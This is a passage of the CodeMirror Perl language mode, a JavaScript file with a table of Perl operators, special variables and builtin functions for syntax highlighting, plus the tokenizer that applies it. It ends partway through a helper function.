// CodeMirror, copyright (c) by Marijn Haverbeke and others
// Distributed under an MIT license: https://codemirror.net/LICENSE

// CodeMirror2 mode/perl/perl.js (text/x-perl) beta 0.10 (2011-11-08)
// This is a part of CodeMirror from https://github.com/sabaca/CodeMirror_mode_perl (mail@sabaca.com)

(function(mod) {
  if (typeof exports == "object" && typeof module == "object") // CommonJS
    mod(require("../../lib/codemirror"));
  else if (typeof define == "function" && define.amd) // AMD
    define(["../../lib/codemirror"], mod);
  else // Plain browser env
    mod(CodeMirror);
})(function(CodeMirror) {
"use strict";

CodeMirror.defineMode("perl",function(){
        // http://perldoc.perl.org
        var PERL={                                      //   null - magic touch
                                                        //   1 - keyword
                                                        //   2 - def
                                                        //   3 - atom
                                                        //   4 - operator
                                                        //   5 - variable-2 (predefined)
                                                        //   [x,y] - x=1,2,3; y=must be defined if x{...}
                                                //      PERL operators
                '->'                            :   4,
                '++'                            :   4,
                '--'                            :   4,
                '**'                            :   4,
                                                        //   ! ~ \ and unary + and -
                '=~'                            :   4,
                '!~'                            :   4,
                '*'                             :   4,
                '/'                             :   4,
                '%'                             :   4,
                'x'                             :   4,
                '+'                             :   4,
                '-'                             :   4,
                '.'                             :   4,
                '<<'                            :   4,
                '>>'                            :   4,
                                                        //   named unary operators
                '<'                             :   4,
                '>'                             :   4,
                '<='                            :   4,
                '>='                            :   4,
                'lt'                            :   4,
                'gt'                            :   4,
                'le'                            :   4,
                'ge'                            :   4,
                '=='                            :   4,
                '!='                            :   4,
                '<=>'                           :   4,
                'eq'                            :   4,
                'ne'                            :   4,
                'cmp'                           :   4,
                '~~'                            :   4,
                '&'                             :   4,
                '|'                             :   4,
                '^'                             :   4,
                '&&'                            :   4,
                '||'                            :   4,
                '//'                            :   4,
                '..'                            :   4,
                '...'                           :   4,
                '?'                             :   4,
                ':'                             :   4,
                '='                             :   4,
                '+='                            :   4,
                '-='                            :   4,
                '*='                            :   4,  //   etc. ???
                ','                             :   4,
                '=>'                            :   4,
                '::'                            :   4,
                                                        //   list operators (rightward)
                'not'                           :   4,
                'and'                           :   4,
                'or'                            :   4,
                'xor'                           :   4,
                                                //      PERL predefined variables (I know, what this is a paranoid idea, but may be needed for people, who learn PERL, and for me as well, ...and may be for you?;)
                'BEGIN'                         :   [5,1],
                'END'                           :   [5,1],
                'PRINT'                         :   [5,1],
                'PRINTF'                        :   [5,1],
                'GETC'                          :   [5,1],
                'READ'                          :   [5,1],
                'READLINE'                      :   [5,1],
                'DESTROY'                       :   [5,1],
                'TIE'                           :   [5,1],
                'TIEHANDLE'                     :   [5,1],
                'UNTIE'                         :   [5,1],
                'STDIN'                         :    5,
                'STDIN_TOP'                     :    5,
                'STDOUT'                        :    5,
                'STDOUT_TOP'                    :    5,
                'STDERR'                        :    5,
                'STDERR_TOP'                    :    5,
                '$ARG'                          :    5,
                '$_'                            :    5,
                '@ARG'                          :    5,
                '@_'                            :    5,
                '$LIST_SEPARATOR'               :    5,
                '$"'                            :    5,
                '$PROCESS_ID'                   :    5,
                '$PID'                          :    5,
                '$$'                            :    5,
                '$REAL_GROUP_ID'                :    5,
                '$GID'                          :    5,
                '$('                            :    5,
                '$EFFECTIVE_GROUP_ID'           :    5,
                '$EGID'                         :    5,
                '$)'                            :    5,
                '$PROGRAM_NAME'                 :    5,
                '$0'                            :    5,
                '$SUBSCRIPT_SEPARATOR'          :    5,
                '$SUBSEP'                       :    5,
                '$;'                            :    5,
                '$REAL_USER_ID'                 :    5,
                '$UID'                          :    5,
                '$<'                            :    5,
                '$EFFECTIVE_USER_ID'            :    5,
                '$EUID'                         :    5,
                '$>'                            :    5,
                '$a'                            :    5,
                '$b'                            :    5,
                '$COMPILING'                    :    5,
                '$^C'                           :    5,
                '$DEBUGGING'                    :    5,
                '$^D'                           :    5,
                '${^ENCODING}'                  :    5,
                '$ENV'                          :    5,
                '%ENV'                          :    5,
                '$SYSTEM_FD_MAX'                :    5,
                '$^F'                           :    5,
                '@F'                            :    5,
                '${^GLOBAL_PHASE}'              :    5,
                '$^H'                           :    5,
                '%^H'                           :    5,
                '@INC'                          :    5,
                '%INC'                          :    5,
                '$INPLACE_EDIT'                 :    5,
                '$^I'                           :    5,
                '$^M'                           :    5,
                '$OSNAME'                       :    5,
                '$^O'                           :    5,
                '${^OPEN}'                      :    5,
                '$PERLDB'                       :    5,
                '$^P'                           :    5,
                '$SIG'                          :    5,
                '%SIG'                          :    5,
                '$BASETIME'                     :    5,
                '$^T'                           :    5,
                '${^TAINT}'                     :    5,
                '${^UNICODE}'                   :    5,
                '${^UTF8CACHE}'                 :    5,
                '${^UTF8LOCALE}'                :    5,
                '$PERL_VERSION'                 :    5,
                '$^V'                           :    5,
                '${^WIN32_SLOPPY_STAT}'         :    5,
                '$EXECUTABLE_NAME'              :    5,
                '$^X'                           :    5,
                '$1'                            :    5, // - regexp $1, $2...
                '$MATCH'                        :    5,
                '$&'                            :    5,
                '${^MATCH}'                     :    5,
                '$PREMATCH'                     :    5,
                '$`'                            :    5,
                '${^PREMATCH}'                  :    5,
                '$POSTMATCH'                    :    5,
                "$'"                            :    5,
                '${^POSTMATCH}'                 :    5,
                '$LAST_PAREN_MATCH'             :    5,
                '$+'                            :    5,
                '$LAST_SUBMATCH_RESULT'         :    5,
                '$^N'                           :    5,
                '@LAST_MATCH_END'               :    5,
                '@+'                            :    5,
                '%LAST_PAREN_MATCH'             :    5,
                '%+'                            :    5,
                '@LAST_MATCH_START'             :    5,
                '@-'                            :    5,
                '%LAST_MATCH_START'             :    5,
                '%-'                            :    5,
                '$LAST_REGEXP_CODE_RESULT'      :    5,
                '$^R'                           :    5,
                '${^RE_DEBUG_FLAGS}'            :    5,
                '${^RE_TRIE_MAXBUF}'            :    5,
                '$ARGV'                         :    5,
                '@ARGV'                         :    5,
                'ARGV'                          :    5,
                'ARGVOUT'                       :    5,
                '$OUTPUT_FIELD_SEPARATOR'       :    5,
                '$OFS'                          :    5,
                '$,'                            :    5,
                '$INPUT_LINE_NUMBER'            :    5,
                '$NR'                           :    5,
                '$.'                            :    5,
                '$INPUT_RECORD_SEPARATOR'       :    5,
                '$RS'                           :    5,
                '$/'                            :    5,
                '$OUTPUT_RECORD_SEPARATOR'      :    5,
                '$ORS'                          :    5,
                '$\\'                           :    5,
                '$OUTPUT_AUTOFLUSH'             :    5,
                '$|'                            :    5,
                '$ACCUMULATOR'                  :    5,
                '$^A'                           :    5,
                '$FORMAT_FORMFEED'              :    5,
                '$^L'                           :    5,
                '$FORMAT_PAGE_NUMBER'           :    5,
                '$%'                            :    5,
                '$FORMAT_LINES_LEFT'            :    5,
                '$-'                            :    5,
                '$FORMAT_LINE_BREAK_CHARACTERS' :    5,
                '$:'                            :    5,
                '$FORMAT_LINES_PER_PAGE'        :    5,
                '$='                            :    5,
                '$FORMAT_TOP_NAME'              :    5,
                '$^'                            :    5,
                '$FORMAT_NAME'                  :    5,
                '$~'                            :    5,
                '${^CHILD_ERROR_NATIVE}'        :    5,
                '$EXTENDED_OS_ERROR'            :    5,
                '$^E'                           :    5,
                '$EXCEPTIONS_BEING_CAUGHT'      :    5,
                '$^S'                           :    5,
                '$WARNING'                      :    5,
                '$^W'                           :    5,
                '${^WARNING_BITS}'              :    5,
                '$OS_ERROR'                     :    5,
                '$ERRNO'                        :    5,
                '$!'                            :    5,
                '%OS_ERROR'                     :    5,
                '%ERRNO'                        :    5,
                '%!'                            :    5,
                '$CHILD_ERROR'                  :    5,
                '$?'                            :    5,
                '$EVAL_ERROR'                   :    5,
                '$@'                            :    5,
                '$OFMT'                         :    5,
                '$#'                            :    5,
                '$*'                            :    5,
                '$ARRAY_BASE'                   :    5,
                '$['                            :    5,
                '$OLD_PERL_VERSION'             :    5,
                '$]'                            :    5,
                                                //      PERL blocks
                'if'                            :[1,1],
                elsif                           :[1,1],
                'else'                          :[1,1],
                'while'                         :[1,1],
                unless                          :[1,1],
                'for'                           :[1,1],
                foreach                         :[1,1],
                                                //      PERL functions
                'abs'                           :1,     // - absolute value function
                accept                          :1,     // - accept an incoming socket connect
                alarm                           :1,     // - schedule a SIGALRM
                'atan2'                         :1,     // - arctangent of Y/X in the range -PI to PI
                bind                            :1,     // - binds an address to a socket
                binmode                         :1,     // - prepare binary files for I/O
                bless                           :1,     // - create an object
                bootstrap                       :1,     //
                'break'                         :1,     // - break out of a "given" block
                caller                          :1,     // - get context of the current subroutine call
                chdir                           :1,     // - change your current working directory
                chmod                           :1,     // - changes the permissions on a list of files
                chomp                           :1,     // - remove a trailing record separator from a string
                chop                            :1,     // - remove the last character from a string
                chown                           :1,     // - change the ownership on a list of files
                chr                             :1,     // - get character this number represents
                chroot                          :1,     // - make directory new root for path lookups
                close                           :1,     // - close file (or pipe or socket) handle
                closedir                        :1,     // - close directory handle
                connect                         :1,     // - connect to a remote socket
                'continue'                      :[1,1], // - optional trailing block in a while or foreach
                'cos'                           :1,     // - cosine function
                crypt                           :1,     // - one-way passwd-style encryption
                dbmclose                        :1,     // - breaks binding on a tied dbm file
                dbmopen                         :1,     // - create binding on a tied dbm file
                'default'                       :1,     //
                defined                         :1,     // - test whether a value, variable, or function is defined
                'delete'                        :1,     // - deletes a value from a hash
                die                             :1,     // - raise an exception or bail out
                'do'                            :1,     // - turn a BLOCK into a TERM
                dump                            :1,     // - create an immediate core dump
                each                            :1,     // - retrieve the next key/value pair from a hash
                endgrent                        :1,     // - be done using group file
                endhostent                      :1,     // - be done using hosts file
                endnetent                       :1,     // - be done using networks file
                endprotoent                     :1,     // - be done using protocols file
                endpwent                        :1,     // - be done using passwd file
                endservent                      :1,     // - be done using services file
                eof                             :1,     // - test a filehandle for its end
                'eval'                          :1,     // - catch exceptions or compile and run code
                'exec'                          :1,     // - abandon this program to run another
                exists                          :1,     // - test whether a hash key is present
                exit                            :1,     // - terminate this program
                'exp'                           :1,     // - raise I to a power
                fcntl                           :1,     // - file control system call
                fileno                          :1,     // - return file descriptor from filehandle
                flock                           :1,     // - lock an entire file with an advisory lock
                fork                            :1,     // - create a new process just like this one
                format                          :1,     // - declare a picture format with use by the write() function
                formline                        :1,     // - internal function used for formats
                getc                            :1,     // - get the next character from the filehandle
                getgrent                        :1,     // - get next group record
                getgrgid                        :1,     // - get group record given group user ID
                getgrnam                        :1,     // - get group record given group name
                gethostbyaddr                   :1,     // - get host record given its address
                gethostbyname                   :1,     // - get host record given name
                gethostent                      :1,     // - get next hosts record
                getlogin                        :1,     // - return who logged in at this tty
                getnetbyaddr                    :1,     // - get network record given its address
                getnetbyname                    :1,     // - get networks record given name
                getnetent                       :1,     // - get next networks record
                getpeername                     :1,     // - find the other end of a socket connection
                getpgrp                         :1,     // - get process group
                getppid                         :1,     // - get parent process ID
                getpriority                     :1,     // - get current nice value
                getprotobyname                  :1,     // - get protocol record given name
                getprotobynumber                :1,     // - get protocol record numeric protocol
                getprotoent                     :1,     // - get next protocols record
                getpwent                        :1,     // - get next passwd record
                getpwnam                        :1,     // - get passwd record given user login name
                getpwuid                        :1,     // - get passwd record given user ID
                getservbyname                   :1,     // - get services record given its name
                getservbyport                   :1,     // - get services record given numeric port
                getservent                      :1,     // - get next services record
                getsockname                     :1,     // - retrieve the sockaddr for a given socket
                getsockopt                      :1,     // - get socket options on a given socket
                given                           :1,     //
                glob                            :1,     // - expand filenames using wildcards
                gmtime                          :1,     // - convert UNIX time into record or string using Greenwich time
                'goto'                          :1,     // - create spaghetti code
                grep                            :1,     // - locate elements in a list test true against a given criterion
                hex                             :1,     // - convert a string to a hexadecimal number
                'import'                        :1,     // - patch a module's namespace into your own
                index                           :1,     // - find a substring within a string
                'int'                           :1,     // - get the integer portion of a number
                ioctl                           :1,     // - system-dependent device control system call
                'join'                          :1,     // - join a list into a string using a separator
                keys                            :1,     // - retrieve list of indices from a hash
                kill                            :1,     // - send a signal to a process or process group
                last                            :1,     // - exit a block prematurely
                lc                              :1,     // - return lower-case version of a string
                lcfirst                         :1,     // - return a string with just the next letter in lower case
                length                          :1,     // - return the number of bytes in a string
                'link'                          :1,     // - create a hard link in the filesystem
                listen                          :1,     // - register your socket as a server
                local                           : 2,    // - create a temporary value for a global variable (dynamic scoping)
                localtime                       :1,     // - convert UNIX time into record or string using local time
                lock                            :1,     // - get a thread lock on a variable, subroutine, or method
                'log'                           :1,     // - retrieve the natural logarithm for a number
                lstat                           :1,     // - stat a symbolic link
                m                               :null,  // - match a string with a regular expression pattern
                map                             :1,     // - apply a change to a list to get back a new list with the changes
                mkdir                           :1,     // - create a directory
                msgctl                          :1,     // - SysV IPC message control operations
                msgget                          :1,     // - get SysV IPC message queue
                msgrcv                          :1,     // - receive a SysV IPC message from a message queue
                msgsnd                          :1,     // - send a SysV IPC message to a message queue
                my                              : 2,    // - declare and assign a local variable (lexical scoping)
                'new'                           :1,     //
                next                            :1,     // - iterate a block prematurely
                no                              :1,     // - unimport some module symbols or semantics at compile time
                oct                             :1,     // - convert a string to an octal number
                open                            :1,     // - open a file, pipe, or descriptor
                opendir                         :1,     // - open a directory
                ord                             :1,     // - find a character's numeric representation
                our                             : 2,    // - declare and assign a package variable (lexical scoping)
                pack                            :1,     // - convert a list into a binary representation
                'package'                       :1,     // - declare a separate global namespace
                pipe                            :1,     // - open a pair of connected filehandles
                pop                             :1,     // - remove the last element from an array and return it
                pos                             :1,     // - find or set the offset for the last/next m//g search
                print                           :1,     // - output a list to a filehandle
                printf                          :1,     // - output a formatted list to a filehandle
                prototype                       :1,     // - get the prototype (if any) of a subroutine
                push                            :1,     // - append one or more elements to an array
                q                               :null,  // - singly quote a string
                qq                              :null,  // - doubly quote a string
                qr                              :null,  // - Compile pattern
                quotemeta                       :null,  // - quote regular expression magic characters
                qw                              :null,  // - quote a list of words
                qx                              :null,  // - backquote quote a string
                rand                            :1,     // - retrieve the next pseudorandom number
                read                            :1,     // - fixed-length buffered input from a filehandle
                readdir                         :1,     // - get a directory from a directory handle
                readline                        :1,     // - fetch a record from a file
                readlink                        :1,     // - determine where a symbolic link is pointing
                readpipe                        :1,     // - execute a system command and collect standard output
                recv                            :1,     // - receive a message over a Socket
                redo                            :1,     // - start this loop iteration over again
                ref                             :1,     // - find out the type of thing being referenced
                rename                          :1,     // - change a filename
                require                         :1,     // - load in external functions from a library at runtime
                reset                           :1,     // - clear all variables of a given name
                'return'                        :1,     // - get out of a function early
                reverse                         :1,     // - flip a string or a list
                rewinddir                       :1,     // - reset directory handle
                rindex                          :1,     // - right-to-left substring search
                rmdir                           :1,     // - remove a directory
                s                               :null,  // - replace a pattern with a string
                say                             :1,     // - print with newline
                scalar                          :1,     // - force a scalar context
                seek                            :1,     // - reposition file pointer for random-access I/O
                seekdir                         :1,     // - reposition directory pointer
                select                          :1,     // - reset default output or do I/O multiplexing
                semctl                          :1,     // - SysV semaphore control operations
                semget                          :1,     // - get set of SysV semaphores
                semop                           :1,     // - SysV semaphore operations
                send                            :1,     // - send a message over a socket
                setgrent                        :1,     // - prepare group file for use
                sethostent                      :1,     // - prepare hosts file for use
                setnetent                       :1,     // - prepare networks file for use
                setpgrp                         :1,     // - set the process group of a process
                setpriority                     :1,     // - set a process's nice value
                setprotoent                     :1,     // - prepare protocols file for use
                setpwent                        :1,     // - prepare passwd file for use
                setservent                      :1,     // - prepare services file for use
                setsockopt                      :1,     // - set some socket options
                shift                           :1,     // - remove the first element of an array, and return it
                shmctl                          :1,     // - SysV shared memory operations
                shmget                          :1,     // - get SysV shared memory segment identifier
                shmread                         :1,     // - read SysV shared memory
                shmwrite                        :1,     // - write SysV shared memory
                shutdown                        :1,     // - close down just half of a socket connection
                'sin'                           :1,     // - return the sine of a number
                sleep                           :1,     // - block for some number of seconds
                socket                          :1,     // - create a socket
                socketpair                      :1,     // - create a pair of sockets
                'sort'                          :1,     // - sort a list of values
                splice                          :1,     // - add or remove elements anywhere in an array
                'split'                         :1,     // - split up a string using a regexp delimiter
                sprintf                         :1,     // - formatted print into a string
                'sqrt'                          :1,     // - square root function
                srand                           :1,     // - seed the random number generator
                stat                            :1,     // - get a file's status information
                state                           :1,     // - declare and assign a state variable (persistent lexical scoping)
                study                           :1,     // - optimize input data for repeated searches
                'sub'                           :1,     // - declare a subroutine, possibly anonymously
                'substr'                        :1,     // - get or alter a portion of a string
                symlink                         :1,     // - create a symbolic link to a file
                syscall                         :1,     // - execute an arbitrary system call
                sysopen                         :1,     // - open a file, pipe, or descriptor
                sysread                         :1,     // - fixed-length unbuffered input from a filehandle
                sysseek                         :1,     // - position I/O pointer on handle used with sysread and syswrite
                system                          :1,     // - run a separate program
                syswrite                        :1,     // - fixed-length unbuffered output to a filehandle
                tell                            :1,     // - get current seekpointer on a filehandle
                telldir                         :1,     // - get current seekpointer on a directory handle
                tie                             :1,     // - bind a variable to an object class
                tied                            :1,     // - get a reference to the object underlying a tied variable
                time                            :1,     // - return number of seconds since 1970
                times                           :1,     // - return elapsed time for self and child processes
                tr                              :null,  // - transliterate a string
                truncate                        :1,     // - shorten a file
                uc                              :1,     // - return upper-case version of a string
                ucfirst                         :1,     // - return a string with just the next letter in upper case
                umask                           :1,     // - set file creation mode mask
                undef                           :1,     // - remove a variable or function definition
                unlink                          :1,     // - remove one link to a file
                unpack                          :1,     // - convert binary structure into normal perl variables
                unshift                         :1,     // - prepend more elements to the beginning of a list
                untie                           :1,     // - break a tie binding to a variable
                use                             :1,     // - load in a module at compile time
                utime                           :1,     // - set a file's last access and modify times
                values                          :1,     // - return a list of the values in a hash
                vec                             :1,     // - test or set particular bits in a string
                wait                            :1,     // - wait for any child process to die
                waitpid                         :1,     // - wait for a particular child process to die
                wantarray                       :1,     // - get void vs scalar vs list context of current subroutine call
                warn                            :1,     // - print debugging info
                when                            :1,     //
                write                           :1,     // - print a picture record
                y                               :null}; // - transliterate a string

        var RXstyle="string-2";
        var RXmodifiers=/[goseximacplud]/;              // NOTE: "m", "s", "y" and "tr" need to correct real modifiers for each regexp type

        function tokenChain(stream,state,chain,style,tail){     // NOTE: chain.length > 2 is not working now (it's for s[...][...]geos;)
                state.chain=null;                               //                                                          12   3tail
                state.style=null;
                state.tail=null;
                state.tokenize=function(stream,state){
                        var e=false,c,i=0;
                        while(c=stream.next()){
                                if(c===chain[i]&&!e){
                                        if(chain[++i]!==undefined){
                                                state.chain=chain[i];
                                                state.style=style;
                                                state.tail=tail;}
                                        else if(tail)
                                                stream.eatWhile(tail);
                                        state.tokenize=tokenPerl;
                                        return style;}
                                e=!e&&c=="\\";}
                        return style;};
                return state.tokenize(stream,state);}

        function tokenSOMETHING(stream,state,string){
                state.tokenize=function(stream,state){
                        if(stream.string==string)
                                state.tokenize=tokenPerl;
                        stream.skipToEnd();
                        return "string";};
                return state.tokenize(stream,state);}

        function tokenPerl(stream,state){
                if(stream.eatSpace())
                        return null;
                if(state.chain)
                        return tokenChain(stream,state,state.chain,state.style,state.tail);
                if(stream.match(/^(\-?((\d[\d_]*)?\.\d+(e[+-]?\d+)?|\d+\.\d*)|0x[\da-fA-F_]+|0b[01_]+|\d[\d_]*(e[+-]?\d+)?)/))
                        return 'number';
                if(stream.match(/^<<(?=[_a-zA-Z])/)){                  // NOTE: <<SOMETHING\n...\nSOMETHING\n
                        stream.eatWhile(/\w/);
                        return tokenSOMETHING(stream,state,stream.current().substr(2));}
                if(stream.sol()&&stream.match(/^\=item(?!\w)/)){// NOTE: \n=item...\n=cut\n
                        return tokenSOMETHING(stream,state,'=cut');}
                var ch=stream.next();
                if(ch=='"'||ch=="'"){                           // NOTE: ' or " or <<'SOMETHING'\n...\nSOMETHING\n or <<"SOMETHING"\n...\nSOMETHING\n
                        if(prefix(stream, 3)=="<<"+ch){
                                var p=stream.pos;
                                stream.eatWhile(/\w/);
                                var n=stream.current().substr(1);
                                if(n&&stream.eat(ch))
                                        return tokenSOMETHING(stream,state,n);
                                stream.pos=p;}
                        return tokenChain(stream,state,[ch],"string");}
                if(ch=="q"){
                        var c=look(stream, -2);
                        if(!(c&&/\w/.test(c))){
                                c=look(stream, 0);
                                if(c=="x"){
                                        c=look(stream, 1);
                                        if(c=="("){
                                                eatSuffix(stream, 2);
                                                return tokenChain(stream,state,[")"],RXstyle,RXmodifiers);}
                                        if(c=="["){
                                                eatSuffix(stream, 2);
                                                return tokenChain(stream,state,["]"],RXstyle,RXmodifiers);}
                                        if(c=="{"){
                                                eatSuffix(stream, 2);
                                                return tokenChain(stream,state,["}"],RXstyle,RXmodifiers);}
                                        if(c=="<"){
                                                eatSuffix(stream, 2);
                                                return tokenChain(stream,state,[">"],RXstyle,RXmodifiers);}
                                        if(/[\^'"!~\/]/.test(c)){
                                                eatSuffix(stream, 1);
                                                return tokenChain(stream,state,[stream.eat(c)],RXstyle,RXmodifiers);}}
                                else if(c=="q"){
                                        c=look(stream, 1);
                                        if(c=="("){
                                                eatSuffix(stream, 2);
                                                return tokenChain(stream,state,[")"],"string");}
                                        if(c=="["){
                                                eatSuffix(stream, 2);
                                                return tokenChain(stream,state,["]"],"string");}
                                        if(c=="{"){
                                                eatSuffix(stream, 2);
                                                return tokenChain(stream,state,["}"],"string");}
                                        if(c=="<"){
                                                eatSuffix(stream, 2);
                                                return tokenChain(stream,state,[">"],"string");}
                                        if(/[\^'"!~\/]/.test(c)){
                                                eatSuffix(stream, 1);
                                                return tokenChain(stream,state,[stream.eat(c)],"string");}}
                                else if(c=="w"){
                                        c=look(stream, 1);
                                        if(c=="("){
                                                eatSuffix(stream, 2);
                                                return tokenChain(stream,state,[")"],"bracket");}
                                        if(c=="["){
                                                eatSuffix(stream, 2);
                                                return tokenChain(stream,state,["]"],"bracket");}
                                        if(c=="{"){
                                                eatSuffix(stream, 2);
                                                return tokenChain(stream,state,["}"],"bracket");}
                                        if(c=="<"){
                                                eatSuffix(stream, 2);
                                                return tokenChain(stream,state,[">"],"bracket");}
                                        if(/[\^'"!~\/]/.test(c)){
                                                eatSuffix(stream, 1);
                                                return tokenChain(stream,state,[stream.eat(c)],"bracket");}}
                                else if(c=="r"){
                                        c=look(stream, 1);
                                        if(c=="("){
                                                eatSuffix(stream, 2);
                                                return tokenChain(stream,state,[")"],RXstyle,RXmodifiers);}
                                        if(c=="["){
                                                eatSuffix(stream, 2);
                                                return tokenChain(stream,state,["]"],RXstyle,RXmodifiers);}
                                        if(c=="{"){
                                                eatSuffix(stream, 2);
                                                return tokenChain(stream,state,["}"],RXstyle,RXmodifiers);}
                                        if(c=="<"){
                                                eatSuffix(stream, 2);
                                                return tokenChain(stream,state,[">"],RXstyle,RXmodifiers);}
                                        if(/[\^'"!~\/]/.test(c)){
                                                eatSuffix(stream, 1);
                                                return tokenChain(stream,state,[stream.eat(c)],RXstyle,RXmodifiers);}}
                                else if(/[\^'"!~\/(\[{<]/.test(c)){
                                        if(c=="("){
                                                eatSuffix(stream, 1);
                                                return tokenChain(stream,state,[")"],"string");}
                                        if(c=="["){
                                                eatSuffix(stream, 1);
                                                return tokenChain(stream,state,["]"],"string");}
                                        if(c=="{"){
                                                eatSuffix(stream, 1);
                                                return tokenChain(stream,state,["}"],"string");}
                                        if(c=="<"){
                                                eatSuffix(stream, 1);
                                                return tokenChain(stream,state,[">"],"string");}
                                        if(/[\^'"!~\/]/.test(c)){
                                                return tokenChain(stream,state,[stream.eat(c)],"string");}}}}
                if(ch=="m"){
                        var c=look(stream, -2);
                        if(!(c&&/\w/.test(c))){
                                c=stream.eat(/[(\[{<\^'"!~\/]/);
                                if(c){
                                        if(/[\^'"!~\/]/.test(c)){
                                                return tokenChain(stream,state,[c],RXstyle,RXmodifiers);}
                                        if(c=="("){
                                                return tokenChain(stream,state,[")"],RXstyle,RXmodifiers);}
                                        if(c=="["){
                                                return tokenChain(stream,state,["]"],RXstyle,RXmodifiers);}
                                        if(c=="{"){
                                                return tokenChain(stream,state,["}"],RXstyle,RXmodifiers);}
                                        if(c=="<"){
                                                return tokenChain(stream,state,[">"],RXstyle,RXmodifiers);}}}}
                if(ch=="s"){
                        var c=/[\/>\]})\w]/.test(look(stream, -2));
                        if(!c){
                                c=stream.eat(/[(\[{<\^'"!~\/]/);
                                if(c){
                                        if(c=="[")
                                                return tokenChain(stream,state,["]","]"],RXstyle,RXmodifiers);
                                        if(c=="{")
                                                return tokenChain(stream,state,["}","}"],RXstyle,RXmodifiers);
                                        if(c=="<")
                                                return tokenChain(stream,state,[">",">"],RXstyle,RXmodifiers);
                                        if(c=="(")
                                                return tokenChain(stream,state,[")",")"],RXstyle,RXmodifiers);
                                        return tokenChain(stream,state,[c,c],RXstyle,RXmodifiers);}}}
                if(ch=="y"){
                        var c=/[\/>\]})\w]/.test(look(stream, -2));
                        if(!c){
                                c=stream.eat(/[(\[{<\^'"!~\/]/);
                                if(c){
                                        if(c=="[")
                                                return tokenChain(stream,state,["]","]"],RXstyle,RXmodifiers);
                                        if(c=="{")
                                                return tokenChain(stream,state,["}","}"],RXstyle,RXmodifiers);
                                        if(c=="<")
                                                return tokenChain(stream,state,[">",">"],RXstyle,RXmodifiers);
                                        if(c=="(")
                                                return tokenChain(stream,state,[")",")"],RXstyle,RXmodifiers);
                                        return tokenChain(stream,state,[c,c],RXstyle,RXmodifiers);}}}
                if(ch=="t"){
                        var c=/[\/>\]})\w]/.test(look(stream, -2));
                        if(!c){
                                c=stream.eat("r");if(c){
                                c=stream.eat(/[(\[{<\^'"!~\/]/);
                                if(c){
                                        if(c=="[")
                                                return tokenChain(stream,state,["]","]"],RXstyle,RXmodifiers);
                                        if(c=="{")
                                                return tokenChain(stream,state,["}","}"],RXstyle,RXmodifiers);
                                        if(c=="<")
                                                return tokenChain(stream,state,[">",">"],RXstyle,RXmodifiers);
                                        if(c=="(")
                                                return tokenChain(stream,state,[")",")"],RXstyle,RXmodifiers);
                                        return tokenChain(stream,state,[c,c],RXstyle,RXmodifiers);}}}}
                if(ch=="`"){
                        return tokenChain(stream,state,[ch],"variable-2");}
                if(ch=="/"){
                        if(!/~\s*$/.test(prefix(stream)))
                                return "operator";
                        else
                                return tokenChain(stream,state,[ch],RXstyle,RXmodifiers);}
                if(ch=="$"){
                        var p=stream.pos;
                        if(stream.eatWhile(/\d/)||stream.eat("{")&&stream.eatWhile(/\d/)&&stream.eat("}"))
                                return "variable-2";
                        else
                                stream.pos=p;}
                if(/[$@%]/.test(ch)){
                        var p=stream.pos;
                        if(stream.eat("^")&&stream.eat(/[A-Z]/)||!/[@$%&]/.test(look(stream, -2))&&stream.eat(/[=|\\\-#?@;:&`~\^!\[\]*'"$+.,\/<>()]/)){
                                var c=stream.current();
                                if(PERL[c])
                                        return "variable-2";}
                        stream.pos=p;}
                if(/[$@%&]/.test(ch)){
                        if(stream.eatWhile(/[\w$]/)||stream.eat("{")&&stream.eatWhile(/[\w$]/)&&stream.eat("}")){
                                var c=stream.current();
                                if(PERL[c])
                                        return "variable-2";
                                else
                                        return "variable";}}
                if(ch=="#"){
                        if(look(stream, -2)!="$"){
                                stream.skipToEnd();
                                return "comment";}}
                if(/[:+\-\^*$&%@=<>!?|\/~\.]/.test(ch)){
                        var p=stream.pos;
                        stream.eatWhile(/[:+\-\^*$&%@=<>!?|\/~\.]/);
                        if(PERL[stream.current()])
                                return "operator";
                        else
                                stream.pos=p;}
                if(ch=="_"){
                        if(stream.pos==1){
                                if(suffix(stream, 6)=="_END__"){
                                        return tokenChain(stream,state,['\0'],"comment");}
                                else if(suffix(stream, 7)=="_DATA__"){
                                        return tokenChain(stream,state,['\0'],"variable-2");}
                                else if(suffix(stream, 7)=="_C__"){
                                        return tokenChain(stream,state,['\0'],"string");}}}
                if(/\w/.test(ch)){
                        var p=stream.pos;
                        if(look(stream, -2)=="{"&&(look(stream, 0)=="}"||stream.eatWhile(/\w/)&&look(stream, 0)=="}"))
                                return "string";
                        else
                                stream.pos=p;}
                if(/[A-Z]/.test(ch)){
                        var l=look(stream, -2);
                        var p=stream.pos;
                        stream.eatWhile(/[A-Z_]/);
                        if(/[\da-z]/.test(look(stream, 0))){
                                stream.pos=p;}
                        else{
                                var c=PERL[stream.current()];
                                if(!c)
                                        return "meta";
                                if(c[1])
                                        c=c[0];
                                if(l!=":"){
                                        if(c==1)
                                                return "keyword";
                                        else if(c==2)
                                                return "def";
                                        else if(c==3)
                                                return "atom";
                                        else if(c==4)
                                                return "operator";
                                        else if(c==5)
                                                return "variable-2";
                                        else
                                                return "meta";}
                                else
                                        return "meta";}}
                if(/[a-zA-Z_]/.test(ch)){
                        var l=look(stream, -2);
                        stream.eatWhile(/\w/);
                        var c=PERL[stream.current()];
                        if(!c)
                                return "meta";
                        if(c[1])
                                c=c[0];
                        if(l!=":"){
                                if(c==1)
                                        return "keyword";
                                else if(c==2)
                                        return "def";
                                else if(c==3)
                                        return "atom";
                                else if(c==4)
                                        return "operator";
                                else if(c==5)
                                        return "variable-2";
                                else
                                        return "meta";}
                        else
                                return "meta";}
                return null;}

        return {
            startState: function() {
                return {
                    tokenize: tokenPerl,
                    chain: null,
                    style: null,
                    tail: null
                };
            },
            token: function(stream, state) {
                return (state.tokenize || tokenPerl)(stream, state);
            },
            lineComment: '#'
        };
});

CodeMirror.registerHelper("wordChars", "perl", /[\w$]/);

CodeMirror.defineMIME("text/x-perl", "perl");

// it's like "peek", but need for look-ahead or look-behind if index < 0
function look(stream, c){
  return stream.string.charAt(stream.pos+(c||0));
}

// return a part of prefix of current stream from current position
function prefix(stream, c){
  if(c){
    var x=stream.pos-c;
    return stream.string.substr((x>=0?x:0),c);}
  else{
    return stream.string.substr(0,stream.pos-1);
  }
}

// return a part of suffix of current stream from current position
function suffix(stream, c){
  var y=stream.string.length;
  var x=y-stream.pos+1;
  return stream.string.substr(stream.pos,(c&&c<y?c:x));
}

// eating and vomiting a part of stream from current position
function eatSuffix(stream, c){
  var x=stream.pos+c;
